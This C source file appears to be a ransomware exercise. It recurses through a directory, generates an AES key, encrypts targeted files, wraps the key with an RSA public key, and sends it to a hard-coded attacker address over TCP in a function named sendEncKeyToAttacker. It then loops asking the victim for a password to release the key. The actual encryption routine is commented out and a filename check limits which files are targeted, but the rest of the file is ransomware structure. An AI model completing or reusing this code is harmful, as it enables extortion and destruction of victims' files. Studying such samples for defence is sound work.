#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>


EVP_CIPHER_CTX* dirEncryptContext = NULL;
unsigned char* dirEncryptKey = NULL;
int keyLen = 0;

void printString(unsigned char* string, unsigned length){

    if(length !=0){

        for(int i =0; i<length; i++){
            printf(" %u ", string[i]);
        }
        printf("\n");

    }else{

        int end =0;
        int count = 0;
        while(!end){
            printf(" %u ", string[count]);
            if(string[count] ==0){
                end = 1;
                printf("\n");
            }
            count++;
        }
    }

}


//sets outLen to final length of encrypted key
//returns encrypted key
unsigned char* encryptTempKey(unsigned char* tempKey, int tempKeyLen, size_t* outLen){


    //assumes the public key will always be name public.pem and be at same directory level
    FILE* pubKeyFilePtr = fopen("public.pem", "r");
    if(!pubKeyFilePtr){
        printf("Error opening public key file\n");
        return 0;
    }

    EVP_PKEY * pubkeyPtr = PEM_read_PUBKEY(pubKeyFilePtr, NULL,NULL, NULL);

    EVP_PKEY_CTX *ctx;
    EVP_PKEY *key;
    unsigned char * out;

    ctx = EVP_PKEY_CTX_new(pubkeyPtr, NULL);

    if (!ctx){
        printf("Error generating pubkey context\n");
        return 0;
    }

    int retVal;
    retVal= EVP_PKEY_encrypt_init(ctx);
    if(retVal <1){
        printf("Error initializing pubkey context\n");
        return 0;
    }

    retVal = EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING);
    if(retVal <1){
        printf("Error setting padding context\n");
        return 0;
    }

    /* Determine buffer length */
    retVal = EVP_PKEY_encrypt(ctx, NULL, outLen, tempKey, tempKeyLen);
    if(retVal <1){
        printf("Error buffer length context\n");
        return 0;
    }

    out = OPENSSL_malloc(*outLen);
    if (!out){
        printf("Error out buffer alloc\n");
        return 0;
    }

    retVal = EVP_PKEY_encrypt(ctx, out, outLen, tempKey, tempKeyLen);
    if (retVal<1){
        printf("Error public encrypt\n");
        return 0;
    }

    printf("Encrypted Key Size: %i\n", (int)*outLen);
    printf("Encrypt Key: ");
    for(int i =0;i <*outLen; i++){

        printf("_ %i",(int) out[i]);

    }
    printf("\n");



    return out;

    fclose(pubKeyFilePtr);
}


int block_encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
{

   /* EVP_CIPHER_CTX *ctx;

    int len;
    int outLength = plaintext_len;


    ctx = EVP_CIPHER_CTX_new();


    EVP_EncryptInit_ex(ctx,  EVP_aes_256_cbc(), NULL,key,iv);


    EVP_EncryptUpdate(ctx, ciphertext, &outLength, plaintext, plaintext_len);


    EVP_EncryptFinal_ex(ctx,ciphertext + outLength ,&outLength);


    EVP_CIPHER_CTX_free(ctx);


    return outLength;
    */
   return 0;
}

int sendEncKeyToAttacker(unsigned char* encryptedKey,char* ipaddress){

    int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    char* ip = "172.31.146.244";

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return -1;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(ip);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return -1;
    }

    //encrypted key length will always be the same when using the same starting symmetric key length/algo
    //aes 32size key -> rsa 256 size enc
    const unsigned int clientMsgSize = 256;
    //memset(clientMessage, 0, sizeof(clientMessage));

    ssize_t bytesSent = send(sockfd, encryptedKey, clientMsgSize, 0);
    if(bytesSent == -1) {
        printf("error Sending Key\n");
        return -1;
    }

    //Receive the server's response:
    //size_t inputBufferLength = 100;
    //char inputBuffer[inputBufferLength];
    //ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);
    //if(bytesReceived == -1){
        //printf("errorReceive\n");
        //return -1;
    //}
    //else printf("Server says: %s\n", inputBuffer);

    int retCloseVal = close(sockfd);
    if(retCloseVal == -1) {
        printf("ErrorClosing\n");
        return -1;
    }

    return 0;

}

//assumes both char arrays have null terminator
char* concatStrings(char* str1, char* str2){


    int str1Len = 0;
    while(str1[str1Len] != 0){
        str1Len++;
    }
    int str2Len = 0;
    while(str2[str2Len] != 0){
        str2Len++;
    }

    //length of new string has one added to it to include new null terminator
    char* concat = (char*)malloc((str1Len + str2Len + 1) * sizeof(char));

    for(int i =0; i <str1Len; i++){
        concat[i] = str1[i];
    }
    for(int i =0; i < str2Len; i++){
        concat[i+str1Len] = str2[i];
    }
    concat[str1Len + str2Len] = 0;
    return concat;

}


int encryptFile(struct stat* entryInfo, char* fullPath, char* fileName){

    printf("encrypting file %s\n", fileName );

    int readChar;

    int index = 0;

    unsigned char readInBuffer[100];
    unsigned char cipherBuffer[100];

    FILE *inputFilePtr;
    FILE *outputFilePtr;

    inputFilePtr = fopen(fullPath, "r");

    //append mode so file isnt overwritten
    outputFilePtr = fopen("testEnc.txt", "a");

    //check for errors when opening file and creating file output
    if(inputFilePtr == NULL){
        printf("ERROR when opening file");
    }
    if(outputFilePtr == NULL){
        printf("ERROR when creating output file to write to");
    }
    //read in each char of the input file one at a time, then encrypt in blocks
    while(!feof(inputFilePtr)){
        //encrypt each block everytime the buffer is filled up
        //then add the cipherblock to the output file
        if(index == 9){

            //inputBuffer,inputSize,key,IV, cipherbuffer
            int retVal = block_encrypt(readInBuffer, 10, dirEncryptKey, "penjamin", cipherBuffer);
            fputs(cipherBuffer, outputFilePtr);
            //reset index to 0
            index = 0;
        }

        readChar = fgetc(inputFilePtr);
        readInBuffer[index] = readChar;
        index++;

    }

    fclose(inputFilePtr);
    fclose(outputFilePtr);

}

//returns 1 for yes, 0 for no
//these are some arbitrary conditions the file needs to have in order to be encrypted.
//mainly a safeguard to make sure it doesnt accidently go rogue.
int checkIfEncryptFile(char* fullPath, char* fileName){

    if(strstr(fileName, "malwareExample")){

        return 1;
    }
    else{
        return 0;
    }
}
int navigateUserDirectory(char* directoryPath){

    int len;
    int outLength = 0;
    int errorVal = 0;

    //symmetric(temporary) key generation
    if(dirEncryptContext == NULL){

        dirEncryptContext = EVP_CIPHER_CTX_new();

        EVP_EncryptInit_ex(dirEncryptContext,  EVP_aes_256_cbc(), NULL,NULL,NULL);

        keyLen = EVP_CIPHER_CTX_key_length(dirEncryptContext);

        //key is not given a null terminating char, it is just a normal char array
        dirEncryptKey = (unsigned char*)malloc((keyLen) * sizeof(unsigned char));

        errorVal = EVP_CIPHER_CTX_rand_key(dirEncryptContext,dirEncryptKey);
        if(errorVal <1){
            printf("%s", "Error with symmetric key gen\n");
            return -1;

        }
        else{

            printf("Original generated Key Size: %i\n", keyLen);
            printf("Original generated Key: ");
            for(int i =0;i <keyLen; i++){

                printf("_ %i",(int) dirEncryptKey[i]);

            }
            printf("\n");


        }

        //clear key gen context to make sure there are no remnants of key that user can recover
        //clearing is handled by this method
        EVP_CIPHER_CTX_free(dirEncryptContext);

    }

    DIR* userDir;
    if ((userDir = opendir(directoryPath)) == NULL) {
        perror("Cannot open path ");
        exit(1);
    }

    struct dirent* currentEntry = NULL;

    while ((currentEntry = readdir(userDir)) != NULL) {

        char* entryName = (*currentEntry).d_name;

        //ignore hidden dirs
        if((strcmp(entryName,".") == 0) || (strcmp(entryName,"..") == 0)) continue;

        char slash[2] = {'/',0};
        char* dirWithSlash = concatStrings(directoryPath,slash);
        char* fullPath = concatStrings(dirWithSlash, entryName);

        printf("%s\n", fullPath);

        struct stat entryInfo;
        if(stat(fullPath,&entryInfo) < 0){
            perror("Cannot open entry ");
            exit(1);
        }

        //S_IFMT is bit mask for file type, st_mode is mask for file type and some other info.
        int mask = entryInfo.st_mode & S_IFMT;
        if(mask == S_IFREG){
            printf("reg file\n");
            if(checkIfEncryptFile(fullPath,entryName)) encryptFile(&entryInfo,fullPath,entryName);

        }
        else{
            if(mask == S_IFDIR)printf("directory\n");
            //we only care about regular files, which we will encrypt, and directories,which we may recurse on.
        }

    }


    size_t encryptedLen;
    unsigned char * encKey = encryptTempKey(dirEncryptKey,keyLen,&encryptedLen);
    sendEncKeyToAttacker(encKey,"");

    //clear key to make sure there are no remnants of key that user can recover
    memset(dirEncryptKey, 0, keyLen);
    free(dirEncryptKey);
    keyLen = 0;
    printf("null reached \n");

    return 0;


}
unsigned char* sendPasswordGuess(unsigned char ** outputKey){

    int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    char* ip = "172.31.146.244";

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return NULL;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(ip);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return NULL;
    }

    printf("Enter a password(max 30 chars): \n");

    const unsigned int clientMsgSize = 30;
    unsigned char clientMessage[clientMsgSize];
    memset(clientMessage, 0, sizeof(clientMessage));
    fgets(clientMessage, clientMsgSize, stdin);


    ssize_t bytesSent = send(sockfd, clientMessage, clientMsgSize, 0);
    if(bytesSent == -1) {
        printf("error Sending Password\n");
        return NULL;
    }

    //Receive the server's response:
    size_t inputBufferLength = 32;
    unsigned char * inputBuffer = malloc(sizeof(unsigned char) * inputBufferLength);
    char wrong[6] = {'w','r','o','n','g',0};

    ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);

    if(bytesReceived == -1){
        printf("errorReceive\n");
        return NULL;
    }
    else{
        //wrong
        if(bytesReceived == 1){
            printf("Server says wrong\n");
            *outputKey = NULL;
        }
        else{
            printf("Server sent key\n");
            *outputKey = inputBuffer;
        }
        int retCloseVal = close(sockfd);
        if(retCloseVal == -1) {
            printf("ErrorClosing\n");
            return NULL;
        }
    }


    return NULL;
}

int main(int argc, unsigned char** argv){

    if(argc < 2){
        printf("provide a directory\n");
        return 0;
    }
    printf("%s\n", argv[0]);
    printf("%s\n", argv[1]);
    navigateUserDirectory(argv[1]);


    int passwordCorrect = 0;
    unsigned char* key;
    while(!passwordCorrect){
        sendPasswordGuess(&key);
        if(key != NULL) passwordCorrect = 1;
    }

    printf("Recieved Key: \n");
    printString(key,32);
    free(key);

    return 0;

}
